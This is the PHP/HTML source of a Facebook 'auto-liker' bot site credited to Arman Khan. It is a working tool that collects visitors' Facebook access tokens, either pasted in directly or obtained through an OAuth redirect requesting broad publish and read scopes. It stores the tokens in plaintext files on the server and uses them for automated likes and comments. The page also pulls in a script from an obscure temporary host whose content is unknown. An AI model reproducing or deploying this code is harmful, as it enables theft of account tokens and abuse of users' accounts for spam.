<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif"> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=0.4"> <title> ▃-⋞ARMAN KHAN ⋟-▃ </title> <style>@font-face {font-family: yasirfonts;src: url(1.ttf);}</style> <style>@font-face {font-family: mughalfonts;src: url(2.ttf);}</style> <style> html { background: url(http://i.imgur.com/iagYykI.gif) no-repeat center center fixed; background-color: #000; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; } a { text-decoration: none; color:white; } #footer { vertical-align: center; } .form { position: absolute; vertical-align: center; width: 98%; top: 40%; } .form1 { position: absolute; vertical-align: center; width: 98%; top: 55%; } .access { position: absolute; vertical-align: center; width: 98%; } .access h2 { margin-top: -15px; } input[type=text] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } input[type=password] { font-family:YASIRfonts; width: 60%; height: 5%; padding: 8px 32px; margin: 8px 0; font-size:22px; box-sizing: border-box; border: 2px solid white; background-color: black; color: white; border-radius:50px; outline: none; text-align: center; } .button { font-family:YASIRfonts; height: 5%; background-color: black; /* Green */ border: 2px solid white; color: white; padding: 8px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 15px; margin: 4px 2px; -webkit-transition-duration: 0.4s; /* Safari */ transition-duration: 0.4s; cursor: pointer; } .button1 { background-color: black; color: white; border-radius:50px; } .button1:hover { background-color: white; color: black; } .button2 { background-color: RED; color: white; border-radius:50px; padding: 3px 8px; } .button2:hover { background-color: black; color: white; } .button3 { background-color: Green; color: white; border-radius:50px; padding: 7px 15px; } .button3:hover { background-color: blue; color: white; }
</style>

</head>
<?php 
session_start();
error_reporting(0);

$site_title = "♥CHAUDHRYS BOTTER♥ ";

// using banned in role will show user that he is banned when he try to login . 
$users = array(
               "MrHeart" => array("name" => "zain", "role"=> "admin"),
               "MrHeart" => array("name" => "junaid", "role"=> "admin"),
               "MrHeart" => array("name" => "sohail", "role"=> "guest"),
               "MrHeart" => array("name" => "arman", "role"=> "guest")
               );

if(isset($_SESSION['logged']) && !isset($users[$_SESSION['password']]) || $users[$_SESSION['password']]['role'] == 'banned'){
      unset($_SESSION['logged']);
      unset($_SESSION['password']);
      unset($_SESSION['username']);
}

if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
	$showlogin = true;
	$loginerror = "";
	
   if(isset($_POST['password'])){

      $password = $_POST['password'];

    if(!empty($password)){

      if(isset($users[$password])){
        
         if($users[$password]['role'] !== 'banned'){
      		$_SESSION['logged'] = true;
      		$_SESSION['password'] = $password;
      		$_SESSION['username'] = $users[$password]['name'];
            $showlogin = false;
          }else{
          	 if(isset($users[$password]['msg']) && !empty($users[$password]['msg'])){
              $loginerror =  $users[$password]['msg'];
          	 }else{
              $loginerror = "You are banned from using this bot! Get out of here!";
            }
          }
      }else{
       	  $loginerror = "Wrong Password!";
      }

     }else{
     	$loginerror = "Please enter Password!";
     }
  }
}

 ?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
♥CHAUDHRYS BOTTER♥
</title><link rel="stylesheet" type="text/css" href="ali.css"

</title><link rel="stylesheet" type="text/css" href="black.css" media="all,box.css"/><link rel="shortcut icon" href=""><script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
<script language="JavaScript" src="http://kijupogo2u.temp.swtest.ru/bb.js"></script>
<?php error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(                                                         
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $cb[]=$b.'='.$c;
}
$true='?'.implode('&',$cb);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by chaudhrysbotter.heck.in',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('cb')){
        mkdir('cb');
}
if($bb){
$blue=fopen('cb/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
        if($z){
if(file_exists('cb/'.$id)){
$file=file_get_contents('cb/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('cb/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('cb/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('cb/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('cb/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('cb/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Data Anda telah ter Save, Robot berjalan otomatis")</script>';}}
}

public function lOgbot($d){
        unlink('cb/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('cb/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';

}else{
        $tiga='on';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">CHAUDHRYS BOTTER FAN '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="green">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like saja</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like tambah komen</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<div id="header">
<h1 class="heading">
<center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/02/28/flamingtext_com_1488315468_68010126.gif" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center>
</h1>
<h2 class="description">
</h2></div>';
} 

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<h2 class="title">
</h2><center>
							<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
								_______________
							</font>
						</center>
						<br>
					<div class="post-content">
</div>

<div class="post-content">
<marquee behavior="scroll" direction="right" scrollamount="20"><font size="30" color="red"></font><font face="Orbitron" size="50" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.2em white, 0pt 2pt 0.2em blue;"><b><font size="30" color="red">$</font> Scrιpт Creαтed By Arмαɴ Kнαɴ <font size="30" color="red"> $</font></b></font><font size="30" color="red"></font></marquee>
<span><a href="https://www.facebook.com/100009434565722" target="_blank">
								<img src="https://graph.facebook.com/100009434565722/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 1000px; height: 1000px; float: left;" alt="ARMAN KHAN" class="thumbnail"/>
							</a>
						<a href="https://www.facebook.com/100015431791355" target="_blank">
							<img src="https://graph.facebook.com/100015431791355/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: right;" alt="ARMAN KHAN" class="thumbnail">
						</a>

						<br>
					</div>
						<center><font face="mughalfonts" size="4" style= "text-shadow: 0pt 0pt 0.9em green, 0pt 2pt 0.9em green; color: lime; font-weight: bold;">
								Follow Me On :
							</font>
								<b>
									<u>
										<a href="https://www.facebook.com/X3.H4NDSOM3" target="_blank">
											<font size="5.6" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: #0DB90B ; font-weight: bold;">
												FACEBOOK 
											</font>
										</a>
									</u>
								<br>
							<font face="mughalfonts" size="3" style= "text-shadow: 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold;">
								Script Bot &copy; 2017
							</font>
							<br>
								<font face="mughalfonts" size="3" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: rgb(255, 255, 255); font-weight: bold;">
									Script Created By Arman Khan
								</font>
							<br><br>
						</center>

							<center>
								<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
									_______________
								</font>
							</center>
						</span>
					</div>
					<br>
<p style="font-weight:bold;">
<br><u><b>scяιρт cяεαтε∂  вү !! CHAUDHRYS BOTTER</u></b> <br>
• яε∂ιяεcт ι∂ • : <a href="http://www.facebook.com/100009434565722">• cℓιcк нεяε •</a></p>
</span>
</div>
<div class="post-meta2">
<br><center><font color="yellow" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="20%"><strong> ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ ♥ ＷＥＬＣＯＭＥ ＴＯ ＭＹ ＳＩＴＥ </strong></marquee>
<br>
</div></div></div>';
}


public function showlogin(){
		 echo '<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link"></a></h3>
<ul id="search-form">
  
  <form action="index.php" method="post">
  <li><div class="login-error">'.$GLOBALS["loginerror"].'</div></li>
   <li><label class="label-password">Password&nbsp;:    </label><input class="inp-text" type="password" style="height: 20px;width: 250px;" name="password"></li>
    <li><label class="label-submit"></label><input class="inp-btn" type="submit" style="height:28px;" value=" SUBMIT"></li>
  </form>
</ul></div></div>';
	}





public function bwh() {
    
 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true){
          $this->showlogin();
          $this->membEr();
          return;
 }
 	echo '<div id="bottom-content">
<div id="navigation-menu">
</span>
</div></center><br>
<center>
<h3><a name="navigation-name" class="no-link">→ ARMAN (HANDSOME)←</a></h3>
<center><a href="https://goo.gl/CvenbL" target="blank"></center><href="http://www.desicomments.com/glitter-text-generator.php"><img src="http://www.desicomments.com/i/17/a.gif" border=0 ><img src="http://www.desicomments.com/i/17/l.gif" border=0 ><img src="http://www.desicomments.com/i/17/l.gif" border=0 ><img src="http://www.desicomments.com/i/17/o.gif" border=0 ><img src="http://www.desicomments.com/i/17/w.gif" border=0 ><img src="http://www.desicomments.com/i/0.gif" border=0 ><img src="http://www.desicomments.com/i/17/a.gif" border=0 ><img src="http://www.desicomments.com/i/17/p.gif" border=0 ><img src="http://www.desicomments.com/i/17/p.gif" border=0 ></a>
<br><a href="https://goo.gl/EwUiuu" target="blank">
<center><href="http://www.desicomments.com/glitter-text-generator.php"><img src="http://www.desicomments.com/i/81/t.gif" border=0 ><img src="http://www.desicomments.com/i/81/o.gif" border=0 ><img src="http://www.desicomments.com/i/81/k.gif" border=0 ><img src="http://www.desicomments.com/i/81/e.gif" border=0 ><img src="http://www.desicomments.com/i/81/n.gif" border=0 ></a>
<ul>
</center>
<div id="top-content">
<div id="search-form">

<center><br><form action="index.php" method="post"> <input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token"> </br> 
<br>
  <input id="sbmt" class="inp-btn" type="submit" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:120px;" value="SUBMIT"></form></div></div></div>';

$this->membEr();
}

public function membEr(){
        if(!is_dir('cokis')){
        mkdir('cokis');
}
$up=opendir('cokis');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
<center><font style="font-family: Iceland;border: 1px solid white;color: white;border-radius: 48px;padding: 11px;font-size: 20px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color: white;background: none;width:140px;">User Active : <font color="red">'.count($user).'</font></font></h3></center><br>
<marquee direction="right"<a><font face="Battle Beasts" size="12"> <script src="babol.js"></script></a></marquee>
</div>';
}



public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<audio controls <audio autoplay loop>
      <source src="http://smp3dl.com/fileDownload/Songs/128/26748.mp3">
</audio>
